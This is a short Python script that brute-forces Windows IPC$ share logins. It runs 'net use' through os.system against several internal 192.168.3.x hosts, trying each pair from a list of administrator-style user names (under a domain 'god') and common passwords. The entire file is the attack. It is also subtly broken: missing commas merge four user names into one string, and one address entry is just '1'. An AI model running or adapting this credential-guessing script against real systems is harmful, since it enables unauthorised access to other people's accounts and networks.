import os, time

ips = {
    '192.168.3.21',
    '192.168.3.25',
    '192.168.3.29',
    '192.168.3.30',
    '1'
}

users = {
    'Administrator',
    'boss',
    'dbadmin',
    'fileadmin',
    'mack'
    'mary'
    'vpnadm'
    'webadmin'
}

passs = {
    'admin',
    'admin!@#45',
    'Admin12345'
}

for ip in ips:
    for user in users:
        for mima in passs:
            exec = "net use \\" + "\\" + ip + "\ipc$ " + mima + " /user:god\\" + user
            print("----->" + exec + "<-----")
            os.system(exec)
            time.sleep(1)
